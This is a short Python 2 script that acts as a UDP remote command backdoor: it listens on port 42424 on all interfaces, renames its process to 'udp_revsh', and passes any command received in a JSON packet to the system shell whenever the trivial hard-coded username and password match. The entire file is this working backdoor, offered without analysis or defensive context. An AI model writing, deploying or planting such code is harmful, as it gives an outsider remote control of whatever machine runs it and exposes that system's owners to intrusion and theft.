#!/usr/bin/python2.7
import socket
import sys
import json
import subprocess

USER = 'user'
PASS = 'pass'
HOST = ''
PORT = 42424

# Set proc name
if sys.platform == 'linux2':
    import ctypes
    libc = ctypes.cdll.LoadLibrary('libc.so.6')
    libc.prctl(15, 'udp_revsh', 0, 0, 0)

# Create UDP socket
try :
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print 'Socket created'
except socket.error, msg :
    print 'Failed to create socket. Err_Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()

# Bind socket to host 
try:
    s.bind((HOST, PORT))
except socket.error , msg:
    print 'Failed - Err_code: ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()
print 'Bind succeed'

while True:
# Data from client
    x = s.recvfrom(1024)
    data = x[0]
    addr = x[1]
    if not data:
        break
    print 'Client~[' + addr[0] + ':' + str(addr[1]) + '] - ' + data.strip()
# Parse JSON
    try:
        js=str(data.strip())
        j=json.loads(js)
        print "%s %s %s" % (j['user'],j['pass'],j['cmd'])
        if (j['user'] == USER ) and  ( j['pass'] == PASS ):
            subprocess.call(j['cmd'], shell=True)
        else:
            print("Wrong Username or Password")

    except ValueError:
        print("Invalid JSON format")

s.close()
